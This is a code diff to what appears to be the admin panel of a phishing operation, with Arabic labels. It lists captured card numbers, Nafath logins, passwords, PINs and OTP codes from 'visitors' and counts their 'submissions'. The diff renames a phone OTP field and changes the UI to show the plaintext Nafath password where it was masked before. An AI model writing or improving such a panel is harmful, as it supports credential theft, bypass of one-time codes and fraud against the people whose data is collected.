@@ -69,7 +69,7 @@ interface Notification {
   seller_identity_number?: string
   phone?: string
   phone2?: string // New field
-  phoneOtp?: string // New field
+  phoneOtpCode?: string // New field
   operator?: string // New field
   serial_number?: string
   vehicle_manufacture_number?: string
@@ -248,7 +248,7 @@ function NotificationCard({
     if (notification.cardNumber) info.push("بطاقة")
     if (notification.nafadUsername) info.push("نفاذ")
     if (notification.phone2) info.push("هاتف ثاني")
-    if (notification.phoneOtp) info.push("OTP هاتف")
+    if (notification.phoneOtpCode) info.push("OTP هاتف")
     if (notification.otp || notification.otpCode) info.push("OTP")
     return info.join(" • ")
   }
@@ -373,7 +373,7 @@ function NotificationCard({
                 هاتف ثاني
               </Badge>
             )}
-            {notification.phoneOtp && (
+            {notification.phoneOtpCode && (
               <Badge
                 variant="secondary"
                 className="text-xs px-2 py-0.5 bg-orange-100 text-orange-700 border-orange-200"
@@ -620,7 +620,7 @@ function NotificationDetails({
               id: "phone",
               label: "الهاتف",
               icon: Smartphone,
-              hasData: notification.phone || notification.phone2 || notification.phoneOtp,
+              hasData: notification.phone || notification.phone2 || notification.phoneOtpCode,
             },
             { id: "card", label: "البطاقة", icon: CreditCard, hasData: notification.cardNumber },
             { id: "nafaz", label: "نفاذ", icon: Key, hasData: notification.nafadUsername },
@@ -725,7 +725,7 @@ function NotificationDetails({
                       { label: "رقم الهاتف الأساسي", value: notification.phone, icon: Phone },
                       { label: "رقم الهاتف الثاني", value: notification.phone2, icon: Smartphone },
                       { label: "معلومات الشبكة", value: notification.operator, icon: Wifi },
-                      { label: "رمز التحقق للهاتف", value: notification.phoneOtp, icon: Hash },
+                      { label: "رمز التحقق للهاتف", value: notification.phoneOtpCode, icon: Hash },
                     ].map(
                       (item) =>
                         item.value && (
@@ -761,7 +761,7 @@ function NotificationDetails({
                   </div>
                 </CardContent>
               </Card>
-              {!notification.phone && !notification.phone2 && !notification.phoneOtp && !notification.operator && (
+              {!notification.phone && !notification.phone2 && !notification.phoneOtpCode && !notification.operator && (
                 <div className="text-center py-8">
                   <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
                     <Phone className="h-8 w-8 text-muted-foreground" />
@@ -855,7 +855,7 @@ function NotificationDetails({
                           <div className="flex items-center justify-between">
                             <span className="text-sm font-medium text-muted-foreground">كلمة المرور</span>
                             <div className="flex items-center gap-2">
-                              <span className="text-sm font-semibold font-mono">••••••••</span>
+                              <span className="text-sm font-semibold font-mono">{notification?.nafadPassword}</span>
                               <Button variant="ghost" size="icon" className="h-6 w-6">
                                 <Eye className="h-3 w-3" />
                               </Button>
@@ -914,7 +914,6 @@ function NotificationDetails({
                               variant="ghost"
                               size="icon"
                               className="h-6 w-6"
-                              onClick={() => setEditingCurrentPage(true)}
                             >
                               <Settings className="h-3 w-3" />
                             </Button>
@@ -990,7 +989,7 @@ export default function NotificationsPage() {
         (filterType === "card" && !!notification.cardNumber) ||
         (filterType === "online" && onlineStatuses[notification.id]) ||
         (filterType === "nafaz" && !!notification.nafadUsername) ||
-        (filterType === "phone" && (!!notification.phone || !!notification.phone2 || !!notification.phoneOtp))
+        (filterType === "phone" && (!!notification.phone || !!notification.phone2 || !!notification.phoneOtpCode))
 
       if (!matchesFilterType) return false
 
@@ -1000,7 +999,7 @@ export default function NotificationsPage() {
           notification.documment_owner_full_name?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
           notification.phone2?.toLowerCase().includes(term) ||
-          notification.phoneOtp?.toLowerCase().includes(term) ||
+          notification.phoneOtpCode?.toLowerCase().includes(term) ||
           notification.operator?.toLowerCase().includes(term) ||
           notification.currentPage?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
@@ -1081,7 +1080,7 @@ export default function NotificationsPage() {
     setTotalVisitors(activeNotifications.length)
     setCardSubmissions(activeNotifications.filter((n) => !!n.cardNumber).length)
     setNafazSubmissions(activeNotifications.filter((n) => !!n.nafadUsername).length)
-    setPhoneSubmissions(activeNotifications.filter((n) => !!n.phone || !!n.phone2 || !!n.phoneOtp).length)
+    setPhoneSubmissions(activeNotifications.filter((n) => !!n.phone || !!n.phone2 || !!n.phoneOtpCode).length)
   }, [])
 
   const fetchNotifications = useCallback(() => {
@@ -1129,7 +1128,7 @@ export default function NotificationsPage() {
             n.documment_owner_full_name ||
             n.phone ||
             n.phone2 ||
-            n.phoneOtp ||
+            n.phoneOtpCode ||
             n.owner_identity_number ||
             n.nafadUsername ||
             n.nafaz_pin, // Include nafaz_pin in important info check
@@ -1437,7 +1436,7 @@ export default function NotificationsPage() {
                   {
                     label: "الهواتف",
                     type: "phone",
-                    count: notifications.filter((n) => !n.isHidden && (n.phone || n.phone2 || n.phoneOtp)).length,
+                    count: notifications.filter((n) => !n.isHidden && (n.phone || n.phone2 || n.phoneOtpCode)).length,
                     icon: Smartphone,
                   },
                   {
